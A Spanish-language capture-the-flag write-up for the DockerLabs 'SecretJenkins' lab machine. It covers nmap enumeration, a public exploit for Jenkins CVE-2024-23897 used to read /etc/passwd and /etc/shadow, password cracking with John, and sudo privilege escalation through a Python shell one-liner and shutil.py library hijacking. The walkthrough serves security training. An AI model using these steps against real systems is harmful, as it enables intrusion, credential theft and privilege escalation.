<p><img src="assets/logo-dockerlabs.png" alt="logodocker" w="200" h="200" /></p>

<p>En este reto de <a href="https://dockerlabs.es" title="dockerlabs">DockerLabs</a>  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios , explotacion de jenkins , obtencion de hashes ,crak password , escalada con python.</p>

<h2 id="herramientas-y-recursos-usados">Herramientas y recursos usados</h2>

<ul>
  <li>nmap</li>
  <li>Feroxbuster</li>
  <li>John the riper</li>
  <li>scp</li>
  <li>Python Library hijacking</li>
</ul>

<h2 id="enumeracion">Enumeracion</h2>

<p>Empezamos lanzando un nmap contra el objetivo .</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">--min-rate</span><span class="o">=</span>5000 <span class="nt">-n</span> <span class="nt">-vvv</span> 172.17.0.2 <span class="nt">-oX</span> SecretJenkins
</code></pre></div></div>
<p><a href="/reporte/SecretJenkins.html" title="reportesnmap">Reporte nmap</a></p>

<p>Nmap nos informa que tenemos el 22 abierto y el 8080 corriendo un servidor web con jenkins.
Empezmos con jenkins intentando averiguar la version para ver si se puede explotar de algun modo.</p>

<p>Lanzo whatweb</p>

<p><img src="assets/SecretJenkins/whatweb.png" alt="whatweb" /></p>

<p>Ya sabemos la version ahora busquemos como explotarla.</p>

<h2 id="explotacion-jenkins">Explotacion jenkins</h2>

<p><a href="https://github.com/godylockz/CVE-2024-23897">exploit CVE-2024-23897</a></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> +x jenkins_fileread.py
./jenkins_fileread.py <span class="nt">-u</span> http://<span class="nv">$ipvictima</span>
</code></pre></div></div>
<p>Leemos y nos copiamos a nuestra maquina el contenido de /etc/passw y /etc/shadow.</p>

<p><img src="assets/SecretJenkins/passwd.png" alt="passwd" /></p>

<p><img src="assets/SecretJenkins/shadow.png" alt="shadow" /></p>

<h2 id="craking-con-john">Craking con john</h2>

<p>Los unimos haciendo uso de unshadow</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unshadow passwd shadow <span class="o">&gt;</span> unshadow

john unshadow
</code></pre></div></div>

<p><img src="assets/SecretJenkins/cracked.png" alt="cracked" /></p>

<h2 id="infiltracion">Infiltracion</h2>

<p>Tenemos suerte y cuando encuetra la pass de bobby corto el craking y entro con bobby.</p>

<p><img src="assets/SecretJenkins/sudobobby.png.png" alt="sudobobby" /></p>

<p>Nos aprovechamos de python para convertirnos en pinguino.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> pinguinito python <span class="nt">-c</span> <span class="s1">'import os; os.system("/bin/sh")'</span>
</code></pre></div></div>

<p><img src="assets/SecretJenkins/movimientolat.png" alt="movilat" /></p>

<p>Ya somo el usuario pinguinito ahora toca ser root haber que encontramos.</p>

<p><img src="assets/SecretJenkins/sudopin.png" alt="sudopin" /></p>

<h2 id="escalada-final">Escalada Final</h2>

<p>Como vemos tenemos la misma escalada que en la maquina library.</p>

<p>Asi que hacemos lo mismo heber si funciona tambien en esta.</p>

<p>Nos creamos un script en python llamado shutil.py y lo a√±adimos al PATH , despues ejecutamos con sudo.</p>

<p>Contenido del script</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import os 

os.system<span class="o">(</span><span class="s2">"/bin/sh"</span><span class="o">)</span>
</code></pre></div></div>
<p>Directorio de trabajo</p>

<p><img src="assets/SecretJenkins/ls.png" alt="opt" /></p>

<p>Ejecutamos</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/python3 /opt/script.sh
</code></pre></div></div>
<p><img src="assets/SecretJenkins/root.png" alt="root" /></p>

<p>Hasta aqui la maquinta , pls insert more coins</p>

<p>Gracias por leer compartamos conocimiento.</p>

